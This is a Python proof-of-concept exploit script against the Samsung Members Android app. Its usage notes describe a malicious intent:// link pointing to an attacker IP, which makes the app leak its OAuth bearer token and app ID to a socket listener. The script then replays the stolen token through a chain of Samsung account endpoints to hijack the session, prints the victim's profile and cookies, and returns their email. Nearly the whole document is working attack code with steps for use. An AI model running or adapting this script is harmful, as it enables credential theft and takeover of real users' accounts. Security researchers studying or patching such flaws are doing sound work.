#!/usr/bin/python3

'''
How to use this script:

1) host a web server and have it host a web page with the following link:

<a href="intent://launch?url=http://<attacker IP>:8000/yay.html&action=sso&from=ZZ&iso=ZZ#Intent;scheme=samsungrewards;package=com.samsung.android.voc;action=android.intent.action.VIEW;end;">yay click here yay</a>

NOTE: replace "<attacker IP>" with the IP address that you'll be running this script from

2) run this script

3) using a samsung phone, browse to the web server and click on the link

4) let the script do its thing
'''

import requests
import socket

class SocketLineReader:
    def __init__(self, socket):
        self.socket = socket
        self._buffer = b''

    def readline(self):
        pre, separator, post = self._buffer.partition(b'\n')
        if separator:
            self._buffer = post
            return pre + separator

        while True:
            data = self.socket.recv(1024)
            if not data:
                return None

            pre, separator, post = data.partition(b'\n')
            if not separator:
                self._buffer += data
            else:
                data = self._buffer + pre + separator
                self._buffer = post
                return data

def getSamsungAccountTokens(authorizationBearerToken, ospAppId):
	# get 'stk' and '_common_physicalAddressText' cookies
	burp0_url = "https://us.account.samsung.com:443/accounts/v1/SA/makeWebSSOGate?clientId={}&redirect_uri=https%3A%2F%2Faccount.samsung.com&auth_server_url=us-auth2.samsungosp.com".format(ospAppId)
	burp0_headers = {"Connection": "close", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G985F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "authorization": "Bearer %s" % (authorizationBearerToken), "x-osp-appid": "%s" % (ospAppId), "X-Requested-With": "com.samsung.android.voc", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	req = requests.get(burp0_url, headers=burp0_headers, allow_redirects=False)
	cookie_stk = req.cookies['stk']
	cookie_commonPhysicalAddressText = req.cookies['_common_physicalAddressText']

	# get 'EUAWSWIPSESSIONID' cookie
	burp0_url = "https://account.samsung.com:443/"
	burp0_cookies = {"stk": "%s" % (cookie_stk), "_common_physicalAddressText": "%s" % (cookie_commonPhysicalAddressText)}
	burp0_headers = {"Connection": "close", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G985F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "authorization": "Bearer %s" % (authorizationBearerToken), "x-osp-appid": "%s" % (ospAppId), "X-Requested-With": "com.samsung.android.voc", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	req = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, allow_redirects=False)
	cookie_EUAWSWIPSESSIONID = req.cookies['EUAWSWIPSESSIONID']

	# get a session started
	burp0_url = "https://account.samsung.com:443/membership"
	burp0_cookies = {"stk": "%s" % (cookie_stk), "_common_physicalAddressText": "%s" % (cookie_commonPhysicalAddressText), "EUAWSWIPSESSIONID": "%s" % (cookie_EUAWSWIPSESSIONID)}
	burp0_headers = {"Connection": "close", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G985F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "authorization": "Bearer %s" % (authorizationBearerToken), "x-osp-appid": "%s" % (ospAppId), "X-Requested-With": "com.samsung.android.voc", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	req = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, allow_redirects=False)

	# get 'EUAWSMBRSESSIONID' cookie
	burp0_url = "https://account.samsung.com:443/mbr-svc/config/getLocale"
	burp0_cookies = {"stk": "%s" % (cookie_stk), "_common_physicalAddressText": "%s" % (cookie_commonPhysicalAddressText), "EUAWSWIPSESSIONID": "%s" % (cookie_EUAWSWIPSESSIONID)}
	burp0_headers = {"Connection": "close", "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G985F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded;charset=utf-8", "X-Requested-With": "com.samsung.android.voc", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://account.samsung.com/membership", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	req = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, allow_redirects=False)
	cookie_EUAWSMBRSESSIONID = req.cookies['EUAWSMBRSESSIONID']

	# get new EUAWSMBRSESSIONID cookie and state value
	burp0_url = "https://account.samsung.com:443/mbr-svc/auth/generateState"
	burp0_cookies = {"stk": "%s" % (cookie_stk), "_common_physicalAddressText": "%s" % (cookie_commonPhysicalAddressText), "EUAWSWIPSESSIONID": "%s" % (cookie_EUAWSWIPSESSIONID), "EUAWSMBRSESSIONID": "%s" % (cookie_EUAWSMBRSESSIONID)}
	burp0_headers = {"Connection": "close", "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G985F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded;charset=utf-8", "X-Requested-With": "com.samsung.android.voc", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://account.samsung.com/membership/auth/sign-in", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	req = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, allow_redirects=False)
	cookie_EUAWSMBRSESSIONID = req.cookies['EUAWSMBRSESSIONID']
	sessionState = req.json()['state']

	# get EUAWSIAMSESSIONID cookie and signin code
	burp0_url = "https://account.samsung.com:443/accounts/v1/MBR/signInGate?locale=en_US&countryCode=US&goBackURL=https%3A%2F%2Faccount.samsung.com%2Fmembership%2Fintro&returnURL=https%3A%2F%2Faccount.samsung.com%2Fmembership%2Fintro&redirect_uri=https%3A%2F%2Faccount.samsung.com%2Fmbr-svc%2Fauth%2FregistAuthentication&tokenType=OAUTH&response_type=code&client_id=k2jxgrvd6k&state={}".format(sessionState)
	burp0_cookies = {"stk": "%s" % (cookie_stk), "_common_physicalAddressText": "%s" % (cookie_commonPhysicalAddressText), "EUAWSWIPSESSIONID": "%s" % (cookie_EUAWSWIPSESSIONID), "EUAWSMBRSESSIONID": "%s" % (cookie_EUAWSMBRSESSIONID)}
	burp0_headers = {"Connection": "close", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G985F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "X-Requested-With": "com.samsung.android.voc", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://account.samsung.com/membership/auth/sign-in", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	req = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, allow_redirects=False)
	cookie_EUAWSIAMSESSIONID = req.cookies['EUAWSIAMSESSIONID']
	sessionCode = req.text[159:169]

	# do sign in yay
	burp0_url = "https://account.samsung.com:443/mbr-svc/auth/registAuthentication?auth_server_url=eu-auth2.samsungosp.com&code={}&code_expires_in=300&state={}&returnURL=https%3A%2F%2Faccount.samsung.com%2Fmembership%2Fintro&api_server_url=eu-auth2.samsungosp.com".format(sessionCode, sessionState)
	burp0_cookies = {"stk": "%s" % (cookie_stk), "_common_physicalAddressText": "%s" % (cookie_commonPhysicalAddressText), "EUAWSWIPSESSIONID": "%s" % (cookie_EUAWSWIPSESSIONID), "EUAWSMBRSESSIONID": "%s" % (cookie_EUAWSMBRSESSIONID), "EUAWSIAMSESSIONID": "%s" % (cookie_EUAWSIAMSESSIONID)}
	burp0_headers = {"Connection": "close", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G985F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "X-Requested-With": "com.samsung.android.voc", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	req = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, allow_redirects=False)

	# get user profile
	burp0_url = "https://account.samsung.com:443/mbr-svc/profile/getUserProfile"
	burp0_cookies = {"stk": "%s" % (cookie_stk), "_common_physicalAddressText": "%s" % (cookie_commonPhysicalAddressText), "EUAWSWIPSESSIONID": "%s" % (cookie_EUAWSWIPSESSIONID), "EUAWSMBRSESSIONID": "%s" % (cookie_EUAWSMBRSESSIONID), "EUAWSIAMSESSIONID": "%s" % (cookie_EUAWSIAMSESSIONID)}
	burp0_headers = {"Connection": "close", "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G985F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded;charset=utf-8", "X-Requested-With": "com.samsung.android.voc", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	req = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, allow_redirects=False)

	print(req.text)
	print("cookie - stk: " + cookie_stk)
	print("cookie - common physical address: " + cookie_commonPhysicalAddressText)
	print("cookie - EUAWSWIPSESSIONID: " + cookie_EUAWSWIPSESSIONID)
	print("cookie - EUAWSMBRSESSIONID: " + cookie_EUAWSMBRSESSIONID)
	print("cookie - EUAWSIAMSESSIONID: " + cookie_EUAWSIAMSESSIONID)
	print("sessionState: " + sessionState)
	print("sessionCode: " + sessionCode)
	
	return req.json()['userProfile']['loginId']

# start script, listen on port 8000

sock1 = socket.socket()
sock1.bind(('', 8000))
sock1.listen(1)

conn, addr = sock1.accept()

print('connected:', addr)

reader = SocketLineReader(conn)
authorizationBearerToken = None
ospAppId = None
while True:
    data = reader.readline()
    if data is not None:
    	yaystryay = data.decode("utf-8")
    	if "authorization" in yaystryay:
    		authorizationBearerToken = yaystryay[22:]
    		print("authorization bearer token: " + authorizationBearerToken)
    	if "x-osp-appid" in yaystryay:
    		ospAppId = yaystryay[13:]
    		print("osp app id: " + ospAppId)
    if not data:
        break
    if authorizationBearerToken is not None and ospAppId is not None:
    	# use tokens to print out the user session
    	email = getSamsungAccountTokens(authorizationBearerToken.rstrip(), ospAppId.rstrip())
    	conn.send(bytes('HTTP/1.0 200 OK\n', 'utf-8'))
    	conn.send(bytes('Content-Type: text/html\n', 'utf-8'))
    	conn.send(bytes('Connection: Close\n', 'utf-8'))
    	conn.send(bytes('\n', 'utf-8'))
    	conn.send(bytes("""
        <html>
        <body>
        	<script>
        		alert('hello %s');
        	</script>
        </body>
        </html>
        """, 'utf-8') % email.encode())
    	break
conn.close()
